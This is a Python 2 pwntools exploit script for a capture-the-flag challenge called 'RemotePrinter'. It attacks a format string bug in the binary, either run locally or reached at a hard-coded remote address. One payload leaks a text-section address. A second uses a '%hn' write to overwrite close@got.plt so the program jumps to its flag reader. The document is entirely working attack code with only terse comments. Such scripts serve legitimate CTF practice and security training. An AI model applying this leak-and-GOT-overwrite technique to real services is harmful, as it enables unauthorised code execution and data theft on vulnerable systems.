#!/usr/bin/env python2
#

from pwn import *
from struct import pack

isRemote = False
port = 3000

if isRemote:
    ip = "/*public address*/"
    offset = 0x1480
else:
    ip = "127.0.0.1"
    offset = 0x139f
    
def print_remote(payload, exploit=False):
    global isRemote
    l = listen(port)
    log.info("launching remote process")
    if isRemote:
        r = remote("188.166.133.53", 12377)
    else:
        r = process("./task/RemotePrinter")
    r.recvuntil("address:")
    r.sendline(str(ip))
    r.recvuntil("port:")
    r.sendline(str(port))
    c = l.wait_for_connection()
    c.sendline(payload)
    r.recvline()
    result = r.recvline().rstrip()
    if not exploit:
        r.close()
    else:
        try:
            result = r.recvline().rstrip()
        except:
            result = "sorry, exploit didn't work"
    c.close()
    return result

textaddr = int(print_remote("AAAA" + ".%2075$08x").split(".")[1], 16)
log.info("leaked text section addr: " + hex(textaddr))

gotplt_close = textaddr + offset
log.info("close@got.plt is at " + hex(gotplt_close))

# close@got.plt is 0x80485c6
# flag.txt reader is at 0x8048867
# need to rewrite only the low bytes to 8867

flag = print_remote(pack("<I", gotplt_close) + "%34915x%7$hn", exploit=True)
log.success(flag)
